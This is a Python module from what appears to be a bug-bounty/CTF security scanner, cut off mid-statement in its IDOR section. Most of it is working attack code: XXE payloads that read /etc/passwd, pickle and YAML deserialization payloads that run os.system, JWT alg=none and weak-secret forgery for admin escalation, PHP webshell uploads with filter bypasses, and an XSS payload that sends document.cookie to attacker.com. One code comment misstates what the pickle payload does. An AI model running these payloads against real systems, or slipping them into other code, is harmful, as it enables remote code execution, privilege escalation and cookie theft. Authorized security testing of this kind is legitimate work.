"""Advanced security testing modules.

Extends the core engine with:
- Defense detection (WAF, rate limit, input filter fingerprinting)
- Race condition testing
- XXE, deserialization, JWT, file upload tests
- XSS and IDOR tests
- GraphQL alias-batch testing
- Chain exploitation helpers
- Structured reporting
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import hmac
import json
import os
import re
import threading
import time
from collections.abc import Mapping
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Any, Final

import requests

from bugbounty_ctf.engine import SecurityScanner

# ============================================================================
# Defense Detection
# ============================================================================

SECURITY_HEADER_NAMES: Final = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
]

WAF_PROBES: Final = [
    ("?x=<script>alert(1)</script>", "XSS"),
    ("?x=' OR 1=1--", "SQLi"),
    ("?x=../../../etc/passwd", "LFI"),
    ("?x=$(id)", "CMDi"),
]

WAF_BODY_INDICATORS: Final = [
    ("blocked by", "Generic"),
    ("access denied", "Generic"),
    ("request blocked", "Generic"),
    ("cloudflare", "Cloudflare"),
    ("attention required", "Cloudflare"),
    ("/cdn-cgi/", "Cloudflare"),
    ("akamai", "Akamai"),
    ("the requested url was rejected", "F5 BIG-IP ASM"),
]

INPUT_FILTER_TEST_CHARS: Final = {
    "single_quote": "'",
    "double_quote": '"',
    "less_than": "<",
    "greater_than": ">",
    "ampersand": "&",
    "pipe": "|",
    "semicolon": ";",
    "backtick": "`",
    "parens": "()",
    "braces": "{}",
    "newline": "\n",
    "null_byte": "\x00",
}


def _header_value(headers: Mapping[str, str], name: str) -> str | None:
    expected = name.lower()
    for header, value in headers.items():
        if header.lower() == expected:
            return str(value)
    return None


def _detect_header_waf(headers: Mapping[str, str]) -> str | None:
    detected_waf: str | None = None
    for header, value in headers.items():
        h_lower = header.lower()
        v_lower = str(value).lower()

        if "cf-ray" in h_lower or "cloudflare" in v_lower:
            detected_waf = "Cloudflare"
        elif "x-amzn" in h_lower or "awselb" in h_lower or "x-amz-cf-id" in h_lower:
            detected_waf = "AWS WAF / CloudFront"
        elif "akamai" in v_lower or "x-akamai" in h_lower:
            detected_waf = "Akamai"
        elif "x-sucuri" in h_lower:
            detected_waf = "Sucuri"
        elif "incap_ses" in v_lower or "visid_incap" in v_lower:
            detected_waf = "Imperva Incapsula"
        elif "x-iinfo" in h_lower:
            detected_waf = "Imperva"
        elif "mod_security" in v_lower or "modsecurity" in v_lower:
            detected_waf = "ModSecurity"
    return detected_waf


def _detect_waf(
    base_url: str,
    session: requests.Session,
    paths: list[str] | None = None,
) -> dict[str, Any]:
    detected_waf: str | None = None
    headers: dict[str, str] = {}
    headers_checked = False
    evidence: list[str] = []

    try:
        response = session.get(base_url, timeout=5)
        headers = dict(response.headers)
        headers_checked = True
        detected_waf = _detect_header_waf(headers)
    except requests.exceptions.RequestException as e:
        evidence.append(f"Header check failed: {e}")

    probe_paths = paths if paths is not None else ["/", "/admin", "/api", "/login"]
    for path in probe_paths[:1]:
        for payload, vtype in WAF_PROBES:
            try:
                response = session.get(base_url.rstrip("/") + path + payload, timeout=5)
                if response.status_code in (403, 406, 429, 501):
                    evidence.append(f"{vtype} probe → {response.status_code} (likely blocked)")
                    if detected_waf is None:
                        detected_waf = "Generic WAF (status-based detection)"
                body_lower = response.text.lower()[:2000]
                for indicator, name in WAF_BODY_INDICATORS:
                    if indicator in body_lower:
                        detected_waf = name
                        evidence.append(f"Body match: '{indicator}' on {vtype} probe")
                        break
            except requests.exceptions.RequestException:
                pass

    return {
        "waf": detected_waf,
        "headers": headers,
        "headers_checked": headers_checked,
        "evidence": evidence,
    }


def _detect_csp(headers: Mapping[str, str]) -> dict[str, str]:
    return {
        "Content-Security-Policy": _header_value(headers, "Content-Security-Policy") or "MISSING"
    }


def _detect_hsts(headers: Mapping[str, str]) -> dict[str, str]:
    return {
        "Strict-Transport-Security": _header_value(headers, "Strict-Transport-Security")
        or "MISSING"
    }


def _detect_security_headers(headers: Mapping[str, str]) -> dict[str, str]:
    security_headers: dict[str, str] = {}
    security_headers.update(_detect_hsts(headers))
    security_headers.update(_detect_csp(headers))
    for header in SECURITY_HEADER_NAMES[2:]:
        security_headers[header] = _header_value(headers, header) or "MISSING"
    return security_headers


def _detect_rate_limit(base_url: str, session: requests.Session) -> dict[str, Any]:
    print("[*] Probing rate limit...")
    evidence: list[str] = []
    rate_limit: str | None = None
    try:
        start = time.time()
        for i in range(20):
            response = session.get(base_url, timeout=3)
            if response.status_code == 429:
                rate_limit = f"Triggered after {i + 1} requests in {time.time() - start:.2f}s"
                break
            time.sleep(0.05)  # 50ms delay — avoids hammering
        if rate_limit is None:
            rate_limit = "No 429 in 20 burst requests"
    except requests.exceptions.RequestException as e:
        evidence.append(f"Rate limit probe failed: {e}")

    return {"rate_limit": rate_limit, "evidence": evidence}


def _detect_input_filters(base_url: str, session: requests.Session) -> list[dict[str, Any]]:
    print("[*] Probing input filters...")
    input_filters: list[dict[str, Any]] = []
    try:
        marker = "ZXTESTZX"
        for name, char in INPUT_FILTER_TEST_CHARS.items():
            payload = f"{marker}{char}{marker}"
            response = session.get(base_url, params={"q": payload}, timeout=3)
            if marker in response.text:
                match = re.search(
                    re.escape(marker) + r"(.*?)" + re.escape(marker),
                    response.text,
                    re.DOTALL,
                )
                if match and match.group(1) != char:
                    input_filters.append(
                        {
                            "char": name,
                            "original": repr(char),
                            "reflected_as": repr(match.group(1)),
                        }
                    )
    except requests.exceptions.RequestException:
        pass
    return input_filters


def detect_defenses(
    base_url: str,
    paths: list[str] | None = None,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Fingerprint WAFs, rate limits, and input filters.

    If a scanner is provided, detected WAF is flagged on it so the scanner
    can throttle or adjust payload strategy.
    """
    if paths is None:
        paths = ["/", "/admin", "/api", "/login"]

    defenses: dict[str, Any] = {
        "waf": None,
        "rate_limit": None,
        "input_filters": [],
        "security_headers": {},
        "evidence": [],
    }

    # Use a fresh session for burst probing — don't contaminate scanner state
    session = requests.Session()
    print(f"[*] Detecting defenses on {base_url}")

    waf_result = _detect_waf(base_url, session, paths)
    defenses["waf"] = waf_result["waf"]
    defenses["evidence"].extend(waf_result["evidence"])
    if waf_result["headers_checked"]:
        defenses["security_headers"] = _detect_security_headers(waf_result["headers"])

    rate_limit_result = _detect_rate_limit(base_url, session)
    defenses["rate_limit"] = rate_limit_result["rate_limit"]
    defenses["evidence"].extend(rate_limit_result["evidence"])

    defenses["input_filters"] = _detect_input_filters(base_url, session)

    # Summary
    print(f"[*] WAF: {defenses['waf'] or 'None detected'}")
    print(f"[*] Rate limit: {defenses['rate_limit']}")
    print(f"[*] Input filters detected: {len(defenses['input_filters'])}")
    missing_sec = [k for k, v in defenses["security_headers"].items() if v == "MISSING"]
    if missing_sec:
        print(f"[*] Missing security headers: {', '.join(missing_sec)}")

    # Feed back into scanner if provided
    if scanner is not None and defenses["waf"]:
        scanner.waf_detected = True
        scanner.defenses_detected.append(defenses["waf"])

    return defenses


# ============================================================================
# Race Conditions
# ============================================================================


def test_race_condition(
    url: str,
    data: dict[str, str] | None = None,
    json_body: dict[str, Any] | None = None,
    method: str = "POST",
    workers: int = 30,
    total_requests: int = 30,
    success_pattern: str | None = None,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Test for race condition vulnerabilities by firing concurrent requests.

    Returns: dict with status_distribution, success_count, total_time, raced
    """
    if data is None and json_body is None:
        raise ValueError("Provide either data= or json_body=")

    print(f"[*] Race test: {workers} workers, {total_requests} requests → {url}")
    barrier = threading.Barrier(min(workers, total_requests))

    def fire(_idx: int) -> dict[str, Any]:
        with contextlib.suppress(threading.BrokenBarrierError):
            barrier.wait(timeout=5)

        try:
            t0 = time.time()
            sess = requests.Session()
            kwargs: dict[str, Any] = {"timeout": 10}
            if headers:
                kwargs["headers"] = headers
            if json_body is not None:
                kwargs["json"] = json_body
            else:
                kwargs["data"] = data
            r = sess.request(method, url, **kwargs)
            return {
                "status": r.status_code,
                "length": len(r.text),
                "body": r.text[:500],
                "elapsed": time.time() - t0,
            }
        except requests.exceptions.RequestException as e:
            return {"status": 0, "error": str(e), "elapsed": 0.0, "length": 0, "body": ""}

    start = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        results = list(ex.map(fire, range(total_requests)))
    elapsed = time.time() - start

    status_dist: dict[int, int] = {}
    for r in results:
        status_dist[r["status"]] = status_dist.get(r["status"], 0) + 1

    if success_pattern:
        success_count = sum(1 for r in results if success_pattern in r.get("body", ""))
    else:
        success_count = sum(1 for r in results if 200 <= r["status"] < 300)

    raced = success_count > 1

    print(f"[*] Done in {elapsed:.2f}s")
    print(f"[*] Status distribution: {status_dist}")
    print(f"[*] Successful responses: {success_count}/{total_requests}")
    if raced:
        print(
            f"[!] RACE CONDITION LIKELY — {success_count} successes on operation expected to be atomic"
        )

    return {
        "status_distribution": status_dist,
        "success_count": success_count,
        "total_requests": total_requests,
        "total_time": elapsed,
        "raced": raced,
        "first_success": next((r for r in results if 200 <= r.get("status", 0) < 300), None),
    }


# ============================================================================
# XXE
# ============================================================================

XXE_BASELINE_XML: Final = "<?xml version='1.0'?><root><test>hello</test></root>"

XXE_EXTERNAL_ENTITY_PAYLOADS: Final = {
    "external_passwd": (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        "<root>&xxe;</root>"
    ),
    "external_hostname": (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
        "<root>&xxe;</root>"
    ),
    "php_filter_b64": (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE root [<!ENTITY xxe SYSTEM "
        '"php://filter/convert.base64-encode/resource=/etc/passwd">]>\n'
        "<root>&xxe;</root>"
    ),
}

XXE_PARAMETER_ENTITY_PAYLOADS: Final = {
    "parameter_entity": (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd">'
        "<!ENTITY % all \"<!ENTITY exfil SYSTEM 'file:///etc/passwd'>\">%all;]>\n"
        "<root>&exfil;</root>"
    ),
}


def _xxe_baseline_response(
    url: str,
    method: str,
    content_type: str,
    session: requests.Session,
) -> requests.Response | None:
    try:
        baseline = session.request(
            method,
            url,
            data=XXE_BASELINE_XML,
            headers={"Content-Type": content_type},
            timeout=5,
        )
        print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
        return baseline
    except requests.exceptions.RequestException as e:
        print(f"[!] Baseline failed: {e}")
        return None


def _xxe_payload_result(
    name: str,
    payload: str,
    url: str,
    method: str,
    content_type: str,
    session: requests.Session,
    baseline: requests.Response,
) -> dict[str, Any] | None:
    try:
        response = session.request(
            method,
            url,
            data=payload,
            headers={"Content-Type": content_type},
            timeout=10,
        )
        confirmed = False
        indicators: list[str] = []

        if "root:" in response.text and "/bin/" in response.text:
            confirmed = True
            indicators.append("/etc/passwd content reflected")
        elif "cm9vdDp4OjA6MDpyb290" in response.text:
            confirmed = True
            indicators.append("base64-encoded /etc/passwd reflected")
        elif response.status_code != baseline.status_code:
            indicators.append(f"status changed: {baseline.status_code}→{response.status_code}")
        elif len(response.text) != len(baseline.text):
            indicators.append(f"length changed: {len(baseline.text)}→{len(response.text)}")

        if confirmed:
            print(f"[!] XXE CONFIRMED: {name}")
            for indicator in indicators:
                print(f"    - {indicator}")
        elif indicators:
            print(f"[?] {name}: {indicators}")
        else:
            print(f"[-] No change: {name}")

        return {
            "payload": name,
            "confirmed": confirmed,
            "indicators": indicators,
            "status": response.status_code,
        }
    except requests.exceptions.RequestException as e:
        print(f"[!] {name} failed: {e}")
        return None


def _xxe_external_entity(
    url: str,
    method: str,
    content_type: str,
    session: requests.Session,
    baseline: requests.Response | None = None,
) -> dict[str, Any]:
    baseline_response = (
        baseline
        if baseline is not None
        else _xxe_baseline_response(url, method, content_type, session)
    )
    if baseline_response is None:
        return {"results": []}

    results: list[dict[str, Any]] = []
    for name, payload in XXE_EXTERNAL_ENTITY_PAYLOADS.items():
        result = _xxe_payload_result(
            name, payload, url, method, content_type, session, baseline_response
        )
        if result is not None:
            results.append(result)
    return {"results": results}


def _xxe_parameter_injection(
    url: str,
    method: str,
    content_type: str,
    session: requests.Session,
    baseline: requests.Response | None = None,
) -> dict[str, Any]:
    baseline_response = (
        baseline
        if baseline is not None
        else _xxe_baseline_response(url, method, content_type, session)
    )
    if baseline_response is None:
        return {"results": []}

    results: list[dict[str, Any]] = []
    for name, payload in XXE_PARAMETER_ENTITY_PAYLOADS.items():
        result = _xxe_payload_result(
            name, payload, url, method, content_type, session, baseline_response
        )
        if result is not None:
            results.append(result)
    return {"results": results}


def test_xxe(
    url: str,
    method: str = "POST",
    content_type: str = "application/xml",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an XML endpoint for XXE."""
    print(f"[*] Testing XXE on {url}")
    session = scanner.session if scanner else requests.Session()

    baseline = _xxe_baseline_response(url, method, content_type, session)
    if baseline is None:
        return []

    results: list[dict[str, Any]] = []
    results.extend(_xxe_external_entity(url, method, content_type, session, baseline)["results"])
    results.extend(
        _xxe_parameter_injection(url, method, content_type, session, baseline)["results"]
    )

    return results


# ============================================================================
# Insecure Deserialization
# ============================================================================


def test_pickle_deserialization(
    url: str,
    method: str = "POST",
    param_name: str = "data",
    marker: str = "DRTBP_DESERIAL_MARKER",
    as_json: bool = False,
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test for Python pickle deserialization vulnerability.

    Uses a benign marker (touches /tmp/marker file) instead of real RCE.
    Marker is sanitized to prevent shell injection via the marker string itself.
    """
    print(f"[*] Testing Python pickle deserialization on {url}")
    session = scanner.session if scanner else requests.Session()

    # Sanitize marker — only allow alphanumerics and underscore
    safe_marker = re.sub(r"[^A-Za-z0-9_]", "", marker)
    if safe_marker != marker:
        print(f"[!] Marker sanitized: '{marker}' → '{safe_marker}'")
    marker_file = f"/tmp/{safe_marker}_{int(time.time())}"

    import pickle

    class Probe:
        def __reduce__(self) -> tuple[Any, tuple[str, ...]]:
            import os

            # Use a list argument, not a shell string — no shell interpolation
            return (os.system, (f"touch {marker_file}",))

    payloads = {
        "raw_pickle": pickle.dumps(Probe()),
        "base64_pickle": base64.b64encode(pickle.dumps(Probe())).decode(),
        "hex_pickle": pickle.dumps(Probe()).hex(),
    }

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        try:
            if as_json:
                r = session.request(method, url, json={param_name: payload}, timeout=5)
            elif method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] DESERIALIZATION RCE CONFIRMED: {name}")
                print(f"    Marker file created: {marker_file}")
                with contextlib.suppress(OSError):
                    os.remove(marker_file)
            else:
                print(f"[-] No execution: {name} (status={r.status_code}, len={len(r.text)})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


def test_yaml_deserialization(
    url: str,
    method: str = "POST",
    param_name: str = "data",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test for YAML deserialization (PyYAML unsafe_load)."""
    print(f"[*] Testing YAML deserialization on {url}")
    session = scanner.session if scanner else requests.Session()

    marker_file = f"/tmp/yaml_marker_{int(time.time())}"

    payloads = {
        "python_object_apply": (f"!!python/object/apply:os.system ['touch {marker_file}']"),
        # Fixed: properly quoted YAML for object/new
        "python_object_new": (f"!!python/object/new:os.system ['touch {marker_file}']"),
    }

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        try:
            if method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] YAML DESERIALIZATION RCE CONFIRMED: {name}")
                with contextlib.suppress(OSError):
                    os.remove(marker_file)
            else:
                print(f"[-] No execution: {name} (status={r.status_code})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# JWT Attacks
# ============================================================================


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> dict[str, Any] | None:
    """Decode a JWT without verification — show header, payload, signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except (ValueError, json.JSONDecodeError) as e:
        return {"error": str(e)}


def forge_jwt_alg_none(payload: dict[str, Any]) -> str:
    """Forge a JWT with alg=none."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def forge_jwt_hs256(payload: dict[str, Any], secret: str | bytes) -> str:
    """Forge a JWT signed with HS256 using `secret`."""
    if isinstance(secret, str):
        secret = secret.encode()
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


JWT_ADMIN_MARKERS: Final = [
    "admin",
    "administrator",
    '"role":"admin"',
    '"is_admin":true',
    "dashboard",
]

JWT_WEAK_SECRETS: Final = [
    "secret",
    "password",
    "key",
    "jwt",
    "admin",
    "test",
    "12345",
    "your-256-bit-secret",
    "default",
    "changeme",
]


def _jwt_escalated_payload(token: str) -> dict[str, Any] | None:
    decoded = decode_jwt(token)
    if not decoded or "error" in decoded:
        return None

    escalated = dict(decoded["payload"])
    for key in ["role", "roles"]:
        if key in escalated:
            escalated[key] = "admin"
    escalated["role"] = "admin"
    escalated["is_admin"] = True
    escalated["admin"] = True
    return escalated


def _is_admin_response(response: requests.Response) -> bool:
    if response.status_code != 200:
        return False
    body_lower = response.text.lower()
    return any(marker in body_lower for marker in JWT_ADMIN_MARKERS)


def _jwt_alg_none_attack(
    token: str,
    verify_endpoint: str,
    header_name: str,
    session: requests.Session,
    *,
    header_prefix: str = "Bearer ",
) -> dict[str, Any]:
    escalated = _jwt_escalated_payload(token)
    none_token = forge_jwt_alg_none(escalated or {})
    none_accepted = False
    print("\n[*] Attack 1: alg=none")
    try:
        response = session.get(
            verify_endpoint,
            headers={header_name: header_prefix + none_token},
            timeout=5,
        )
        if _is_admin_response(response):
            print("[!] alg=none ACCEPTED — server allows unsigned tokens")
            none_accepted = True
        else:
            print(f"[-] alg=none rejected (status={response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[!] alg=none probe failed: {e}")
    return {"none": none_token, "none_accepted": none_accepted}


def _jwt_hs256_empty_attack(
    token: str,
    verify_endpoint: str,
    header_name: str,
    session: requests.Session,
    *,
    header_prefix: str = "Bearer ",
) -> dict[str, Any]:
    escalated = _jwt_escalated_payload(token)
    hs256_empty = forge_jwt_hs256(escalated or {}, "")
    hs256_empty_accepted = False
    print("\n[*] Attack 2: HS256 with empty secret")
    try:
        response = session.get(
            verify_endpoint,
            headers={header_name: header_prefix + hs256_empty},
            timeout=5,
        )
        if _is_admin_response(response):
            print("[!] HS256 with empty secret ACCEPTED")
            hs256_empty_accepted = True
        else:
            print(f"[-] HS256 empty rejected (status={response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[!] HS256 empty probe failed: {e}")
    return {"hs256_empty": hs256_empty, "hs256_empty_accepted": hs256_empty_accepted}


def _jwt_weak_secret_attack(
    token: str,
    verify_endpoint: str,
    header_name: str,
    session: requests.Session,
    *,
    header_prefix: str = "Bearer ",
) -> dict[str, Any]:
    escalated = _jwt_escalated_payload(token)
    print("\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
    weak_secret: str | None = None
    for secret in JWT_WEAK_SECRETS:
        forged = forge_jwt_hs256(escalated or {}, secret)
        try:
            response = session.get(
                verify_endpoint,
                headers={header_name: header_prefix + forged},
                timeout=3,
            )
            if _is_admin_response(response):
                print(f"[!] HS256 with secret '{secret}' ACCEPTED")
                weak_secret = secret
                break
        except requests.exceptions.RequestException:
            continue
    if weak_secret is None:
        print("[-] No weak secret matched")
    return {"weak_secret": weak_secret}


def test_jwt_attacks(
    url: str,
    token: str,
    verify_endpoint: str | None = None,
    header_name: str = "Authorization",
    header_prefix: str = "Bearer ",
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test JWT attacks: alg=none, HS256 with empty/weak secrets.

    Confirmation requires admin-specific content in the response, NOT just
    a 200 status or a long body — the old `len(r.text) > 100` heuristic
    caused false positives on any non-empty page.
    """
    print(f"[*] Testing JWT attacks on {url}")
    session = scanner.session if scanner else requests.Session()

    decoded = decode_jwt(token)
    if not decoded or "error" in decoded:
        print(f"[!] Could not decode token: {decoded}")
        return {}
    print(f"[*] Original header: {decoded['header']}")
    print(f"[*] Original payload: {decoded['payload']}")

    test_target = verify_endpoint or url

    none_result = _jwt_alg_none_attack(
        token, test_target, header_name, session, header_prefix=header_prefix
    )
    hs256_empty_result = _jwt_hs256_empty_attack(
        token, test_target, header_name, session, header_prefix=header_prefix
    )
    weak_secret_result = _jwt_weak_secret_attack(
        token, test_target, header_name, session, header_prefix=header_prefix
    )

    return {
        "none": none_result["none"],
        "none_accepted": none_result["none_accepted"],
        "hs256_empty": hs256_empty_result["hs256_empty"],
        "hs256_empty_accepted": hs256_empty_result["hs256_empty_accepted"],
        "weak_secret": weak_secret_result["weak_secret"],
        "decoded": decoded,
    }


# ============================================================================
# File Upload
# ============================================================================


def test_file_upload(
    url: str,
    file_field: str = "file",
    method: str = "POST",
    *,
    verify_url: str | None = None,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a file upload endpoint with bypass variants.

    If verify_url is provided (or a stored_at path is found in the response),
    attempts to access the uploaded file to confirm RCE.
    """
    print(f"[*] Testing file upload on {url}")
    session = scanner.session if scanner else requests.Session()

    # PHP webshell payloads with various bypasses
    payloads = {
        "plain_php": ("shell.php", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "php3": ("shell.php3", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phtml": ("shell.phtml", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phar": ("shell.phar", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "double_ext": ("shell.php.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "gif_magic": ("shell.php", b"GIF89a;\n<?php system($_GET['c']); ?>", "image/gif"),
        "case_variant": ("shell.PhP", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "null_byte": ("shell.php\x00.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "fake_image_jpg": (
            "shell.jpg",
            b"\xff\xd8\xff\xe0<?php system($_GET['c']); ?>",
            "image/jpeg",
        ),
    }

    results: list[dict[str, Any]] = []
    for name, (filename, content, ctype) in payloads.items():
        try:
            files = {file_field: (filename, content, ctype)}
            r = session.request(method, url, files=files, timeout=10)
            status = r.status_code
            body = r.text[:300]

            url_match = re.search(
                r'(?:path|url|uploaded_to|file)["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
                body,
                re.IGNORECASE,
            )
            stored_at = url_match.group(1) if url_match else None

            accepted = status in (200, 201) and "error" not in body.lower()[:200]
            indicator = "ACCEPTED" if accepted else "rejected"
            print(
                f"[{'!' if accepted else '-'}] {name} → {status} {indicator}"
                + (f"  stored: {stored_at}" if stored_at else "")
            )

            result_entry: dict[str, Any] = {
                "payload": name,
                "filename": filename,
                "status": status,
                "accepted": accepted,
                "stored_at": stored_at,
                "rce_confirmed": False,
            }

            # Verify RCE: try to access the uploaded shell
            check_url = verify_url or stored_at
            if accepted and check_url:
                try:
                    rce = session.get(check_url, params={"c": "id"}, timeout=5)
                    if "uid=" in rce.text:
                        print(f"    [!] RCE CONFIRMED via {check_url}")
                        result_entry["rce_confirmed"] = True
                except requests.exceptions.RequestException:
                    pass

            results.append(result_entry)
        except requests.exceptions.RequestException as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# XSS — Filter Bypass Escalation
# ============================================================================

# Escalation ladder: each level targets a different filter tier.
XSS_PAYLOAD_LADDER: list[dict[str, str]] = [
    {"name": "script_tag", "payload": "<script>alert(1)</script>", "bypasses": "none"},
    {"name": "svg_onload", "payload": "<svg onload=alert(1)>", "bypasses": "script_blocked"},
    {
        "name": "details_ontoggle",
        "payload": "<details open ontoggle=alert(1)>",
        "bypasses": "common_tags_blocked",
    },
    {
        "name": "img_onerror",
        "payload": '<img src=x onerror="alert(1)">',
        "bypasses": "alert_blocked_via_event",
    },
    {
        "name": "svg_animate",
        "payload": "<svg><animate onbegin=alert(1) attributeName=x>",
        "bypasses": "img_blocked",
    },
    {"name": "body_onload", "payload": "<body onload=alert(1)>", "bypasses": "svg_blocked"},
    {
        "name": "input_focus",
        "payload": "<input onfocus=alert(1) autofocus>",
        "bypasses": "body_blocked",
    },
    {
        "name": "marker_fetch",
        "payload": "<img src=x onerror=\"fetch('http://attacker.com/" + "x?'+document.cookie)\">",
        "bypasses": "alert_blocked_exfil",
    },
]


def test_xss(
    url: str,
    method: str = "GET",
    param_name: str = "q",
    *,
    callback_url: str | None = None,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for XSS with filter-bypass escalation.

    If callback_url is provided, payloads that try to trigger a fetch to that
    URL will be confirmed via the callback listener (see callback_listener.py).
    """
    scanner = _get_scanner_xss(url, scanner)
    is_post = method.upper() in ("POST", "PUT", "PATCH")

    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    print(f"[*] Testing XSS on {url} (param: {param_name})")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for entry in XSS_PAYLOAD_LADDER:
        name = entry["name"]
        payload = entry["payload"]

        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        # Check if the payload is reflected unescaped in the response
        reflected = payload in r.text

        escaped_variants = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"),
        ]
        escaped_reflection = any(v in r.text for v in escaped_variants) and not reflected

        confirmed = reflected  # Unescaped reflection = XSS confirmed
        # If callback_url given and payload includes a fetch, callback listener
        # would confirm. We check response body for our payload as a proxy.

        if confirmed:
            print(f"[!] XSS CONFIRMED: {name} — payload reflected unescaped!")
            if scanner is not None:
                scanner._record_finding(
                    url,
                    method,
                    name,
                    ["xss_reflected"],
                    [f"Payload reflected unescaped: {entry['payload']}"],
                    "xss",
                )
        elif escaped_reflection:
            print(f"[-] {name} — reflected but HTML-escaped (filter active)")
        elif r.text != baseline.text:
            print(f"[?] {name} — response changed but payload not reflected")
        else:
            print(f"[-] {name} — not reflected")

        results.append(
            {
                "payload": name,
                "reflected": reflected,
                "escaped": escaped_reflection,
                "confirmed": confirmed,
                "bypasses": entry["bypasses"],
                "status": r.status_code,
            }
        )

    return results


def _get_scanner_xss(url: str, scanner: SecurityScanner | None) -> SecurityScanner:
    """Get or create a scanner for XSS tests."""
    if scanner is not None:
        return scanner
    from bugbounty_ctf.engine import derive_base_url

    return SecurityScanner(derive_base_url(url))


# ============================================================================
# IDOR
# ============================================================================


def _idor_baseline(
    url_template: str,
    session: SecurityScanner,
    *,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    request_headers = headers or {}
    baseline_url = url_template.replace("{ID}", "1")
    try:
        baseline = session._make_request(method, baseline_url, headers=request_headers)
    except requests.exceptions.RequestException as e:
        print(f"[!] Baseline request failed: {e}")
        return [{"error": str(e)}]

    print(f"[*] Baseline (ID=1): status={baseline.status_code}, length={len(baseline.text)}")
    return [
        {
            "id": 1,
            "url_template": url_template,
            "method": method,
            "headers": request_headers,
            "status": baseline.status_code,
            "text": baseline.text,
        }
    ]


def _idor_compare(baseline: list[dict[str, Any]], session: SecurityScanner) -> list[dict[str, Any]]:
    if not baseline or "error" in baseline[0]:
        return []

    from bugbounty_ctf.engine import _similarity_ratio

    baseline_entry = baseline[0]
    url_template = str(baseline_entry["url_template"])
    method = str(baseline_entry["method"])
    headers = baseline_entry["headers"]
    baseline_text = str(baseline_entry["text"])
    baseline_status = int(baseline_entry["status"])
    results: list[dict[str, Any]] = []

    for test_id in range(2, 51):
        test_url = url_template.replace("{ID}", str(test_id))
        try:
            response = session._make_request(method, test_url, headers=headers)
            similarity = _similarity_ratio(baseline_text, response.text)
            same = similarity >= 0.90
            status_match = response.status_code == baseline_status

            result: dict[str, Any] = {
                "id": test_id,
                "status": response.status_code,
                "length": len(response.text),
                "same_as_baseline": same,
                "status_match": status_match,
            }
            if not same and response.status_code == 200:
                distinct_response = {
